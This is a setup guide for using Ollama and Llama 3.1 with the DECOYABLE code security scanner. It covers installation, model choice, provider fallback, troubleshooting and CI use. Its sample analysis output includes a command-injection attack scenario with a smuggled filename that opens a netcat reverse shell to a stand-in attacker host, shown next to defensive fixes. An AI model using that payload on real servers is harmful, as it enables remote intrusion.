# 🚀 Ollama Setup Guide for DECOYABLE v1.2.0

## Why Ollama?

**Ollama + Llama 3.1 gives you FREE, LOCAL AI with ZERO API costs!**

✅ **100% Free** - No API keys, no usage costs
✅ **Runs Locally** - Your code never leaves your machine (privacy!)  
✅ **Fast** - GPU acceleration for instant analysis  
✅ **Offline** - Works without internet after model download  
✅ **High Quality** - Llama 3.1 rivals GPT-4 for security tasks  

---

## 🎯 Quick Start (5 minutes)

### Step 1: Install Ollama

**macOS / Linux:**
```bash
curl -fsSL https://ollama.com/install.sh | sh
```

**Windows:**
Download from: https://ollama.com/download/windows

### Step 2: Download Llama 3.1 Model

```bash
# 8B model (recommended - 4.7GB, fast)
ollama pull llama3.1:8b

# OR 70B model (best quality - 40GB, slower)
ollama pull llama3.1:70b
```

### Step 3: Verify Installation

```bash
ollama list
```

You should see:
```
NAME               ID              SIZE     MODIFIED
llama3.1:8b        ...             4.7 GB   X minutes ago
```

### Step 4: Test with DECOYABLE

```bash
# Standard scan (works without Ollama)
python main.py scan sast ./code

# AI-powered analysis (uses Ollama automatically!)
python main.py ai-analyze ./code --dashboard
```

**That's it!** DECOYABLE will automatically detect and use Ollama.

---

## 📊 What You Get with Ollama

### Without Ollama (Pattern-Based):
```bash
$ python main.py scan sast app.py

🔍 Found 3 vulnerabilities:
  - SQL Injection (HIGH) at line 42
  - Command Injection (CRITICAL) at line 58
  - XSS (MEDIUM) at line 71

Mode: PATTERN-BASED (No AI)
```

### With Ollama (AI-Enhanced):
```bash
$ python main.py ai-analyze app.py --dashboard

🚀 DECOYABLE AI-POWERED SECURITY ANALYSIS
════════════════════════════════════════

🤖 AI Provider: Ollama (Llama 3.1 - LOCAL, FREE)

🔍 Traditional Vulnerabilities: 3
🧠 AI Threat Predictions: 5 (95% confidence)
⛓️  Exploit Chains: 1 critical chain

📊 ENHANCED ANALYSIS:
────────────────────
1. SQL Injection (Line 42)
   AI Insight: "This vulnerability is CRITICAL because it's in 
   an admin panel endpoint. Time to exploitation: 1-2 days.
   Attacker would likely use sqlmap automated tool."
   
   Recommended Fix (AI-generated):
   ✓ Use parameterized queries: cursor.execute(query, (user_id,))
   ✓ Add input validation: if not isinstance(user_id, int)
   ✓ Implement rate limiting on this endpoint

2. Command Injection (Line 58)
   AI Insight: "CRITICAL - This function processes user-uploaded
   filenames. High probability of exploitation via reverse shell."
   
   Attack Scenario (AI-predicted):
   → Attacker uploads file: "file.txt; nc attacker.com 4444 -e /bin/sh"
   → Gains shell access to server
   → Can pivot to internal network
   
   Defense Strategy:
   ✓ Use subprocess.run with list (not shell=True)
   ✓ Whitelist allowed characters in filenames
   ✓ Run file processing in sandboxed container

Mode: AI-POWERED (Ollama Llama 3.1 8B)
Cost: $0.00 (FREE!)
```

---

## 🎨 Available Models

### Recommended Models:

| Model | Size | Speed | Quality | Use Case |
|-------|------|-------|---------|----------|
| **llama3.1:8b** | 4.7GB | ⚡⚡⚡ | ⭐⭐⭐⭐ | **Best default choice** |
| **codellama:7b** | 3.8GB | ⚡⚡⚡ | ⭐⭐⭐⭐⭐ | Code-specific tasks |
| **llama3.1:70b** | 40GB | ⚡ | ⭐⭐⭐⭐⭐ | Maximum quality |
| **phi3:mini** | 2.3GB | ⚡⚡⚡⚡ | ⭐⭐⭐ | Laptops/low RAM |

### Install Multiple Models:
```bash
ollama pull llama3.1:8b      # General purpose
ollama pull codellama:7b      # Code analysis
ollama pull phi3:mini         # Lightweight fallback
```

DECOYABLE will automatically use the best available model!

---

## 🔧 Configuration

### Set Preferred Model (Optional):

**Option 1: Environment Variable**
```bash
export OLLAMA_MODEL=codellama:7b
python main.py ai-analyze ./code
```

**Option 2: Config File**
Create `.decoyable.yaml`:
```yaml
ai:
  provider: ollama
  model: llama3.1:8b
  prefer_local: true
```

---

## ⚡ Performance Tips

### 1. GPU Acceleration
Ollama automatically uses GPU if available. Check with:
```bash
nvidia-smi  # Should show ollama process using GPU
```

### 2. Increase Context Window (for large files)
```bash
# Set larger context window
ollama run llama3.1:8b --context-length 8192
```

### 3. Optimize for Speed
```bash
# Use smaller, faster model for quick scans
export OLLAMA_MODEL=phi3:mini
python main.py scan sast ./large_codebase
```

### 4. Batch Analysis
```bash
# Analyze multiple files efficiently
find . -name "*.py" | xargs -I {} python main.py ai-analyze {}
```

---

## 🌍 Multi-Provider Setup (Advanced)

DECOYABLE supports multiple AI providers with automatic fallback:

### Priority Order:
1. **Ollama** (local, free) - Primary
2. **OpenAI GPT-4** (cloud, paid) - Fallback #1
3. **Anthropic Claude** (cloud, paid) - Fallback #2
4. **Phi-3 Local** (local, free) - Fallback #3
5. **Pattern-based** (no AI) - Always works

### Setup Multiple Providers:

```bash
# Install Ollama (Priority 1)
curl -fsSL https://ollama.com/install.sh | sh
ollama pull llama3.1:8b

# Add OpenAI API key (Optional - Priority 2)
export OPENAI_API_KEY=sk-...

# Add Anthropic API key (Optional - Priority 3)
export ANTHROPIC_API_KEY=sk-ant-...

# Install Phi-3 (Optional - Priority 4)
pip install transformers torch
```

DECOYABLE will automatically:
- Try Ollama first (free, fast)
- Fall back to OpenAI if Ollama fails
- Fall back to Claude if OpenAI fails
- Fall back to Phi-3 if all cloud providers fail
- Always work with pattern-based analysis

### Check Active Provider:
```bash
python main.py ai-status
```

Output:
```
🤖 AI MODEL ROUTER STATUS
════════════════════════════════════════

✓ Active Provider: OLLAMA
  Total Available: 3/5 providers

📊 Provider Status:
  1. 🆓 OLLAMA          [LOCAL]  ← Active
  2. 💰 OPENAI         [CLOUD]
  3. 🆓 PATTERN-BASED  [LOCAL]

💡 TIP: All local providers available (100% free!)
```

---

## 🐛 Troubleshooting

### Problem: "Ollama not available"

**Solution 1: Check if Ollama is running**
```bash
# Check Ollama service
curl http://localhost:11434/api/tags

# Should return JSON with models list
```

**Solution 2: Restart Ollama**
```bash
# macOS/Linux
systemctl restart ollama

# Windows
# Restart Ollama from system tray
```

**Solution 3: Check model is downloaded**
```bash
ollama list

# If empty, download model:
ollama pull llama3.1:8b
```

### Problem: "Model loading failed"

**Check disk space:**
```bash
df -h  # Need 5GB+ free for llama3.1:8b
```

**Try smaller model:**
```bash
ollama pull phi3:mini  # Only 2.3GB
```

### Problem: Slow performance

**Enable GPU (if available):**
```bash
# Check NVIDIA GPU
nvidia-smi

# Install CUDA if not present:
# https://developer.nvidia.com/cuda-downloads
```

**Use smaller model:**
```bash
export OLLAMA_MODEL=phi3:mini
```

**Reduce context length:**
```bash
# In code:
client = OllamaClient(timeout=30.0)  # Reduce from 60s
```

---

## 📚 Additional Resources

### Ollama Documentation:
- Official Site: https://ollama.com
- GitHub: https://github.com/ollama/ollama
- Model Library: https://ollama.com/library

### Llama 3.1 Information:
- Meta AI Blog: https://ai.meta.com/blog/llama-3-1
- Model Card: https://llama.meta.com

### DECOYABLE AI Documentation:
- AI Architecture: `docs/AI_ARCHITECTURE.md`
- Multi-Provider Guide: `docs/MULTI_PROVIDER_GUIDE.md`
- API Reference: `docs/API_REFERENCE.md`

---

## 🎯 Quick Reference

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Download model
ollama pull llama3.1:8b

# Run DECOYABLE with AI
python main.py ai-analyze ./code --dashboard

# Check AI status
python main.py ai-status

# List available models
ollama list

# Test Ollama directly
ollama run llama3.1:8b "Explain SQL injection"
```

---

## 💡 Pro Tips

1. **Use CodeLlama for Code Analysis**
   ```bash
   ollama pull codellama:7b
   export OLLAMA_MODEL=codellama:7b
   ```

2. **Combine with Git Hooks**
   ```bash
   # .git/hooks/pre-commit
   #!/bin/bash
   python main.py ai-analyze . --format json > /tmp/security.json
   if [ $? -eq 1 ]; then
       echo "⚠️  Security issues found! Check /tmp/security.json"
       exit 1
   fi
   ```

3. **CI/CD Integration**
   ```yaml
   # GitHub Actions
   - name: Security Scan
     run: |
       ollama pull llama3.1:8b
       python main.py ai-analyze . --format json
   ```

4. **Development Workflow**
   ```bash
   # Watch for changes and auto-scan
   find . -name "*.py" | entr python main.py ai-analyze _
   ```

---

## 🆘 Support

- 🐛 **Report Issues**: https://github.com/Kolerr-Lab/supper-decoyable-be/issues
- 💬 **Discussions**: https://github.com/Kolerr-Lab/supper-decoyable-be/discussions
- 📧 **Email**: lab.kolerr@kolerr.com
- 🌐 **Community**: [Join Discord](https://discord.gg/decoyable)

---

**Made with ❤️ by the DECOYABLE team**

*"Security should be free, fast, and private."*
